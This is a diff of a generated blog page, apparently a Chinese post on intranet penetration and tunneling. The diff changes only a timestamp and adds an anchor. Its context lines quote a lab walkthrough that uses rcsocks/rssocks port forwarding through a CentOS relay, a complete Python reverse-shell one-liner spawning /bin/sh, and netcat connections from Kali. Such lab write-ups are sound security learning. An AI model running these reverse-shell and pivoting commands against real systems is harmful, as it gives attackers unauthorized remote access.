@@ -117,7 +117,7 @@
 <meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png">
 <meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/reGeorg.png">
 <meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.png">
-<meta property="og:updated_time" content="2017-12-12T10:47:02.275Z">
+<meta property="og:updated_time" content="2017-12-12T10:48:57.008Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网穿透随想">
 <meta name="twitter:description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
@@ -395,6 +395,7 @@
 <p>上，现在需要Centos7做中转。<br>我在Centos上做端口转发</p>
 <p><code>cd /src</code><br><code>./rcsocks -l 1088 -p 1080 -vv</code></p>
 <p>现在我将Ubuntu上执行Python的反弹shell（反弹shell命令很多，请自行搜索），</p>
+<a id="more"></a>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,1089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
 <p>然后kali正向连接Centos就行了</p>
 <p><code>nc 192.168.80.129 1080</code><br>或者<br><code>./rssocks -vv -s 192.168.80.129:1080</code></p>
